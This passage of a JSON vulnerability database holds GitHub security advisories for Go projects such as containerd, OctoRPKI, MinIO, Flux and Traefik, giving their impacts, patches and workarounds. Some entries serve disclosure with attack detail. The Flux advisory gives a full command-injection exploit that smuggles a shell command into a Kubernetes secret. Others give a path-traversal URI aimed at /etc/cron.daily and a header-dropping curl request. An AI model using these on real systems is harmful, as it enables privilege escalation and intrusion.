https://snapcraft.io/edgex-app-service-configurable >= 2.0.0 < 2.1.0\n\n### Patches\nUpgrade to 2.1.0 version of app-functions-sdk-go/v2, app-service-configurable, and related docker containers shown below and modify user scripts to use the new \"aes256\" transform in place of the existing \"aes\" transform.\n\n#### Patched go modules\n- github.com/edgexfoundry/app-functions-sdk-go/v2 v2.1.0\n- github.com/edgexfoundry/app-service-configurable v2.1.0\n\nModification of user scripts is necessary for full remediation.\n\n#### Patched containers\n- https://hub.docker.com/r/edgexfoundry/app-service-configurable:>=2.1.0\n- https://hub.docker.com/r/edgexfoundry/app-service-configurable-arm64:>=2.1.0\n\nModification of user scripts is necessary for full remediation.\n\n#### Patched Snaps\n- https://snapcraft.io/edgex-app-service-configurable >= 2.1.0\n\nModification of user scripts is necessary for full remediation.\n\n### Workarounds\nIf unable to upgrade, change the processing pipeline to use an HTTPS (TLS 1.3) endpoint to export and skip encryption.\n\n### References\n* [2.0 documentation](https://docs.edgexfoundry.org/2.0/microservices/application/BuiltIn/#aes)\n* [2.1 documentation](https://docs.edgexfoundry.org/2.1/microservices/application/BuiltIn/#encryption-deprecated)\n* [GitHub issue](https://github.com/edgexfoundry/app-functions-sdk-go/issues/968)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact us in the [Slack #security channel](https://slack.edgexfoundry.org/)\n* Open an issue in [edgex-go](https://github.com/edgexfoundry/edgex-go)\n* Email us at [EdgeX-TSC-Security@lists.edgexfoundry.org](mailto:EdgeX-TSC-Security@lists.edgexfoundry.org)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/edgexfoundry/app-functions-sdk-go/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/edgexfoundry/app-functions-sdk-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 2.1.0"}}, {"package": {"ecosystem": "Go", "name": "github.com/edgexfoundry/app-service-configurable"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/edgexfoundry/app-functions-sdk-go/security/advisories/GHSA-6c7m-qwxj-mvhp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41278"}, {"type": "WEB", "url": "https://github.com/edgexfoundry/app-functions-sdk-go/commit/8fa13c6388ce76a6b878b54490eac61aa7d81165"}, {"type": "PACKAGE", "url": "https://github.com/edgexfoundry/app-functions-sdk-go"}], "database_specific": {"cwe_ids": ["CWE-327"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-18T23:05:06Z", "nvd_published_at": "2021-11-19T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5j5w-g665-5m35", "modified": "2023-03-30T14:50:04Z", "published": "2021-11-18T16:08:58Z", "aliases": [], "summary": "Ambiguous OCI manifest parsing", "details": "### Impact\n\nIn the OCI Distribution Specification version 1.0.0 and prior and in the OCI Image Specification version 1.0.1 and prior, manifest and index documents are ambiguous without an accompanying Content-Type HTTP header.  Versions of containerd prior to 1.4.12 and 1.5.8 treat the Content-Type header as trusted and deserialize the document according to that header.  If the Content-Type header changed between pulls of the same ambiguous document (with the same digest), the document may be interpreted differently, meaning that the digest alone is insufficient to unambiguously identify the content of the image.\n\n### Patches\n\nThis issue has been fixed in containerd 1.4.12 and 1.5.8.  Image pulls for manifests that contain a \u201cmanifests\u201d field or indices which contain a \u201clayers\u201d field are rejected.\n\n### Workarounds\n\nEnsure you only pull images from trusted sources.\n\n### References\n\nhttps://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m\nhttps://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-5j5w-g665-5m35"}, {"type": "WEB", "url": "https://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m"}, {"type": "WEB", "url": "https://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/26c76a3014e71af5ad2f396ec76e0e0ecc8e25a3"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/db00065a969a983ceb0a409833f93f705f284ea4"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.4.12"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.5.8"}], "database_specific": {"cwe_ids": ["CWE-843"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-11-18T14:43:45Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-26cm-qrc6-mfgj", "modified": "2021-11-02T18:40:07Z", "published": "2021-11-08T18:16:21Z", "aliases": ["CVE-2021-41232"], "summary": "Improper Neutralization of Special Elements used in an LDAP Query in stevenweathers/thunderdome-planning-poker", "details": "### Impact\nLDAP injection vulnerability, only affects instances with LDAP authentication enabled.\n\n### Patches\nPatch for vulnerability released with v1.16.3.\n\n### Workarounds\nDisable LDAP feature if in use\n\n### References\n[OWASP LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html\n)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Thunderdome Github Repository](https://github.com/StevenWeathers/thunderdome-planning-poker)\n* Email us at [steven@weathers.me](mailto:steven@weathers.me)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/stevenweathers/thunderdome-planning-poker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/StevenWeathers/thunderdome-planning-poker/security/advisories/GHSA-26cm-qrc6-mfgj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41232"}, {"type": "WEB", "url": "https://github.com/github/securitylab/issues/464#issuecomment-957094994"}, {"type": "WEB", "url": "https://github.com/StevenWeathers/thunderdome-planning-poker/commit/f1524d01e8a0f2d6c3db5461c742456c692dd8c1"}, {"type": "PACKAGE", "url": "https://github.com/StevenWeathers/thunderdome-planning-poker"}], "database_specific": {"cwe_ids": ["CWE-74", "CWE-90"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-11-02T18:40:07Z", "nvd_published_at": "2021-11-02T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cqh2-vc2f-q4fh", "modified": "2021-11-10T18:16:54Z", "published": "2021-11-10T20:08:29Z", "aliases": ["CVE-2021-3907"], "summary": "Arbitrary filepath traversal via URI injection ", "details": "OctoRPKI does not escape a URI with a filename containing \"..\", this allows a repository to create a file, (ex.  `rsync://example.org/repo/../../etc/cron.daily/evil.roa`), which would then be written to disk outside the base cache folder. This could allow for remote code execution on the host machine OctoRPKI is running on. \n\n## Patches\n\n## For more information\nIf you have any questions or comments about this advisory email us at security@cloudflare.com\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3jhm-87m6-x959"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-cqh2-vc2f-q4fh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3907"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/commit/eb9cc4db7b7b79e44f56dfaa959fccdfb2af8284"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0248"}, {"type": "WEB", "url": "https://www.debian.org/security/2021/dsa-5033"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5041"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-11-10T18:16:54Z", "nvd_published_at": "2021-11-11T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g5gj-9ggf-9vmq", "modified": "2023-10-02T15:58:02Z", "published": "2021-11-10T20:38:53Z", "aliases": ["CVE-2021-3908"], "summary": "Infinite certificate chain depth results in OctoRPKI running forever", "details": "OctoRPKI (github.com/cloudflare/cfrpki/cmd/octorpki) does not limit the depth of a certificate chain, allowing for a CA to create children in an ad-hoc fashion, thereby making tree traversal never end.\n\n### For more information\nIf you have any questions or comments about this advisory email us at security@cloudflare.com \n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-g5gj-9ggf-9vmq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3908"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/releases/tag/v1.4.0"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5041"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-835"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-10T18:18:55Z", "nvd_published_at": "2021-11-11T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-77vh-xpmg-72qh", "modified": "2021-11-24T19:43:35Z", "published": "2021-11-18T16:02:41Z", "aliases": [], "summary": "Clarify `mediaType` handling", "details": "### Impact\nIn the OCI Image Specification version 1.0.1 and prior, manifest and index documents are not self-describing and documents with a single digest could be interpreted as either a manifest or an index.\n\n### Patches\nThe Image Specification will be updated to recommend that both manifest and index documents contain a `mediaType` field to identify the type of document.\nRelease [v1.0.2](https://github.com/opencontainers/image-spec/releases/tag/v1.0.2) includes these updates.\n\n### Workarounds\nSoftware attempting to deserialize an ambiguous document may reject the document if it contains both \u201cmanifests\u201d and \u201clayers\u201d fields or \u201cmanifests\u201d and \u201cconfig\u201d fields.\n\n### References\nhttps://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/opencontainers/image-spec\n* Email us at [security@opencontainers.org](mailto:security@opencontainers.org)\n* https://github.com/opencontainers/image-spec/commits/v1.0.2\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/image-spec"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m"}, {"type": "WEB", "url": "https://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh"}, {"type": "WEB", "url": "https://github.com/opencontainers/image-spec/commit/693428a734f5bab1a84bd2f990d92ef1111cd60c"}, {"type": "PACKAGE", "url": "https://github.com/opencontainers/image-spec"}, {"type": "WEB", "url": "https://github.com/opencontainers/image-spec/releases/tag/v1.0.2"}], "database_specific": {"cwe_ids": ["CWE-843"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-11-17T23:13:41Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4999-659w-mq36", "modified": "2021-11-15T20:27:39Z", "published": "2021-11-15T23:16:49Z", "aliases": ["CVE-2021-41266"], "summary": "Authentication bypass issue in the Operator Console", "details": "During an internal security audit, we detected an authentication bypass issue in the Operator Console when an external IDP is enabled. The security issue has been reported internally. We have not observed this exploit in the wild or reported elsewhere in the community at large. All users are advised to upgrade ASAP.\n\n### Impact\n\nAll users on release v0.12.2 and before are affected.\n\n### Patches\n\nThis issue was fixed by PR https://github.com/minio/console/pull/1217, users should upgrade to latest release.\n\n### Workarounds\n\nAdd `automountServiceAccountToken: false` to the operator-console deployment in Kubernetes so no service account token will get mounted inside the pod, then disable the external identity provider authentication by unset the `CONSOLE_IDP_URL`, `CONSOLE_IDP_CLIENT_ID`, `CONSOLE_IDP_SECRET` and `CONSOLE_IDP_CALLBACK` environment variable and instead use the Kubernetes service account token.\n\n### References\n\n#1217 for more information on the fix and how it was fixed.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [console issues](https://github.com/minio/console/issues)\n* Email us at [security@minio.io](mailto:security@minio.io)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/minio/console"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41266"}, {"type": "WEB", "url": "https://github.com/minio/console/pull/1217"}, {"type": "PACKAGE", "url": "https://github.com/minio/console"}], "database_specific": {"cwe_ids": ["CWE-306"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-11-15T20:27:39Z", "nvd_published_at": "2021-11-15T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g9wh-3vrx-r7hg", "modified": "2021-11-10T18:19:37Z", "published": "2021-11-10T20:39:23Z", "aliases": ["CVE-2021-3912"], "summary": "OctoRPKI crashes when processing GZIP bomb returned via malicious repository", "details": "OctoRPKI tries to load the entire contents of a repository in memory, and in the case of a GZIP bomb, unzip it in memory, making it possible to create a repository that makes OctoRPKI run out of memory (and thus crash). \n\n## Patches\n\n## For more information\nIf you have any questions or comments about this advisory email us at security@cloudflare.com\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-g9wh-3vrx-r7hg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3912"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/commit/648658b1b176a747b52645989cfddc73a81eacad"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0253"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5041"}, {"type": "PACKAGE", "url": "github.com/cloudflare/cfrpki"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-10T18:19:37Z", "nvd_published_at": "2021-11-11T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-35rf-v2jv-gfg7", "modified": "2021-11-12T18:57:27Z", "published": "2021-11-15T17:35:33Z", "aliases": ["CVE-2021-41254"], "summary": "Privilege escalation to cluster admin on multi-tenant environments", "details": "Users that can create Kubernetes Secrets, Service Accounts and Flux Kustomization objects, could execute commands inside the kustomize-controller container by embedding a shell script in a Kubernetes Secret. This can be used to run `kubectl` commands under the Service Account of kustomize-controller, thus allowing an authenticated Kubernetes user to gain cluster admin privileges.\n\n### Impact\n\nMultitenant environments where non-admin users have permissions to create Flux Kustomization objects are affected by this issue.\n\n### Exploit \n\nTo exploit the command injection, first we create a secret with a shell command:\n\n```sh\nkubectl create secret generic exploit-token --from-literal=token=\" || kubectl api-versions\"\n```\n\nThen we create a Service Account that refers to the above Secret:\n\n```yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: exploit\n  namespace: default\nautomountServiceAccountToken: false\nsecrets:\n- name: exploit-token\n```\n\nAnd finally a Kustomization that runs under the above Service Account:\n\n```yaml\napiVersion: kustomize.toolkit.fluxcd.io/v1beta1\nkind: Kustomization\nmetadata:\n  name: exploit\n  namespace: default\nspec:\n  interval: 5m\n  path: \"./deploy/\"\n  sourceRef:\n    kind: GitRepository\n    name: app\n  serviceAccountName: exploit\n```\n\nWhen kustomize-controller reconciles the above Kustomization, it will execute the shell command from the secret.\n\n### Patches\n\nThis vulnerability was fixed in kustomize-controller v0.15.0 (included in flux2 v0.18.0) released on 2021-10-08. Starting with v0.15, the kustomize-controller no longer executes shell commands on the container OS and the `kubectl` binary has been removed from the container image.\n\n### Workarounds\n\nTo prevent the creation of Kubernetes Service Accounts with `secrets` in namespaces owned by tenants, a Kubernetes validation webhook such as Gatekeeper OPA or Kyverno can be used.\n\n```yaml\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: restrict-sa\nspec:\n  validationFailureAction: enforce\n  background: false\n  rules:\n    - name: validate-sa\n      match:\n        resources:\n          kinds:\n            - ServiceAccount\n          namespaces:\n            - tenant1\n            - tenant2\n        subjects:\n          - kind: User\n            name: some@tenant1.com\n          - kind: User\n            name: some@tenant2.com\n          - kind: ServiceAccount\n            name: kustomize-controller\n            namespace: flux-system\n          - kind: ServiceAccount\n            name: helm-controller\n            namespace: flux-system\n      validate:\n        message: \"Invalid service account\"\n        pattern:\n          X(secrets): \"*?\"\n```\n\n### References\n\nDisclosed by ADA Logics in a security audit of the Flux project sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [kustomize-controller repository](http://github.com/fluxcd/kustomize-controller)\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fluxcd/kustomize-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fluxcd/kustomize-controller/security/advisories/GHSA-35rf-v2jv-gfg7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41254"}, {"type": "PACKAGE", "url": "https://github.com/fluxcd/kustomize-controller"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-11-12T18:57:27Z", "nvd_published_at": "2021-11-12T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j6wp-3859-vxfg", "modified": "2021-11-08T21:37:07Z", "published": "2021-11-10T16:52:24Z", "aliases": ["CVE-2021-41230"], "summary": "OIDC claims not updated from Identity Provider in Pomerium", "details": "### Impact\nChanges to the OIDC claims of a user after initial login are not reflected in policy evaluation when using [`allowed_idp_claims`](https://www.pomerium.com/reference/#allowed-idp-claims) as part of policy.  If using `allowed_idp_claims` and a user's claims are changed, Pomerium can make incorrect authorization decisions.\n\n### Patches\nv0.15.6\n\n### Workarounds\n- Clear data on `databroker` service by clearing redis or restarting the in-memory databroker to force claims to be updated\n\n### References\nhttps://github.com/pomerium/pomerium/pull/2724\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Pomerium](https://github.com/pomerium/pomerium)\n* Email us at [security@pomerium.com](mailto:security@pomerium.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.14.0"}, {"fixed": "0.15.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pomerium/pomerium/security/advisories/GHSA-j6wp-3859-vxfg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41230"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/pull/2724"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/commit/f20542c4bf2cc691e4c324f7ec79e02e46d95511"}, {"type": "PACKAGE", "url": "https://github.com/pomerium/pomerium"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0258"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-08T21:37:07Z", "nvd_published_at": "2021-11-05T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mc8v-mgrf-8f4m", "modified": "2021-12-13T13:12:02Z", "published": "2021-11-18T16:13:08Z", "aliases": ["CVE-2021-41190"], "summary": "Clarify Content-Type handling", "details": "### Impact\nIn the OCI Distribution Specification version 1.0.0 and prior, the Content-Type header alone was used to determine the type of document during push and pull operations. Documents that contain both \u201cmanifests\u201d and \u201clayers\u201d fields could be interpreted as either a manifest or an index in the absence of an accompanying Content-Type header. If a Content-Type header changed between two pulls of the same digest, a client may interpret the resulting content differently.\n\n### Patches\nThe OCI Distribution Specification will be updated to require that a `mediaType` value present in a manifest or index match the Content-Type header used during the push and pull operations.\n\n### Workarounds\nClients pulling from a registry may distrust the Content-Type header and reject an ambiguous document that contains both \u201cmanifests\u201d and \u201clayers\u201d fields or \u201cmanifests\u201d and \u201cconfig\u201d fields.\n\n### References\nhttps://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/opencontainers/distribution-spec/\n* Email us at security@opencontainers.org\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/distribution-spec"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41190"}, {"type": "WEB", "url": "https://github.com/opencontainers/distribution-spec/commit/ac28cac0557bcd3084714ab09f9f2356fe504923"}, {"type": "PACKAGE", "url": "https://github.com/opencontainers/distribution-spec"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3TUZNDAH2B26VPBK342UC3BHZNLBUXGX/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4334HT7AZPLWNYHW4ARU6JBUF3VZJPZN/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A2RRFNTMFYKOTRKD37F5ANMCIO3GGJML/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DX63GRWFEI5RVMYV6XLMCG4OHPWZML27/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RZTO6N55WHKHIZI4IMLY2QFBPMVTAERM/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SQBCYJUIM5GVCMFUPRWKRZNXMMI5EFA4/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T4OJ764CKKCWCVONHD4YXTGR7HZ7LRUV/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YIGVQWOA5XXCQXEOOKZX4CDAGLBDRPRX/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/11/19/10"}], "database_specific": {"cwe_ids": ["CWE-843"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-11-17T23:13:37Z", "nvd_published_at": "2021-11-17T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w6ww-fmfx-2x22", "modified": "2021-11-10T18:14:59Z", "published": "2021-11-10T19:56:04Z", "aliases": ["CVE-2021-3911"], "summary": "Misconfigured IP address field in ROA leads to OctoRPKI crash", "details": "If the ROA that a repository returns contains too many bits for the IP address then OctoRPKI will crash.\n\n## Patches\n\n## For more information\nIf you have any questions or comments about this advisory email us at security@cloudflare.com\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-w6ww-fmfx-2x22"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3911"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/commit/2882307febd66801de97b2a2ce4d93fe58132005"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0252"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5041"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-252"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-10T18:14:59Z", "nvd_published_at": "2021-11-11T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f6px-w8rh-7r89", "modified": "2023-09-15T17:59:24Z", "published": "2021-08-02T17:15:05Z", "aliases": ["CVE-2019-16354"], "summary": "Beego has a file creation race condition", "details": "The File Session Manager in Beego 1.10.0 allows local users to read session files because there is a race condition involving file creation within a directory with weak permissions.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/beego/beego"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/astaxie/beego"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-16354"}, {"type": "WEB", "url": "https://github.com/astaxie/beego/issues/3763"}, {"type": "WEB", "url": "https://github.com/beego/beego/issues/3763"}, {"type": "WEB", "url": "https://github.com/beego/beego/pull/3975"}, {"type": "WEB", "url": "https://github.com/beego/beego/pull/3975/commits/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd"}, {"type": "WEB", "url": "https://github.com/astaxie/beego/commit/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd"}, {"type": "WEB", "url": "https://github.com/beego/beego/commit/bac2b31afecc65d9a89f9e473b8006c5edc0c8d1"}, {"type": "PACKAGE", "url": "https://github.com/astaxie/beego"}, {"type": "WEB", "url": "https://github.com/astaxie/beego/blob/v1.12.2/session/sess_file.go#L142"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0084"}], "database_specific": {"cwe_ids": ["CWE-362", "CWE-732"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-07-22T21:51:41Z", "nvd_published_at": "2019-09-16T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m697-4v8f-55qg", "modified": "2021-08-31T20:57:09Z", "published": "2021-08-05T17:04:21Z", "aliases": ["CVE-2021-32813"], "summary": "Header dropping in traefik", "details": "# Impact\n\nThere exists a potential header vulnerability in Traefik's handling of the Connection header. Active exploitation of this issue is unlikely, as it requires that a removed header would lead to a privilege escalation, however, the Traefik team has addressed this issue to prevent any potential abuse.\n\n# Details\n\nIf you have a chain of Traefik middlewares, and one of them sets a request header `Important-Security-Header`, then sending a request with the following Connection header will cause it to be removed before the request was sent:\n\n```\ncurl 'https://example.com' -H \"Connection: Important-Security-Header\" -0\n```\n\nIn this case, the backend does not see the request header `Important-Security-Header`.\n\n# Patches\n\nTraefik 